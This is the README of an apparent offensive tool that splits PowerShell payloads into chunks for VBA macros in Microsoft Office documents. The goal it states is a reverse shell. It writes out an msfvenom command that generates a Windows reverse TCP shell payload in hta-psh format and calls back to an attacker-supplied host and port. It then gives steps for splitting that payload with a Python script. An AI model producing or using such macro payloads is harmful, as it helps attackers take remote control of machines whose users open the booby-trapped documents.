# powershell-script-splitter
Help split powershell payloads into chunks that can be used in vba for Microsoft Office macro reverse shell

1. Use msfvenom to create reverse shell in hta format - `msfvenom -p windows/shell_reverse_tcp lhost=<myip> lport=<lport> -f hta-psh`
 
2. Grab the powershell portion of the output
 
3. Replace the value of ps_script

4. python ps_splitter.py, and get output of the splitted payload
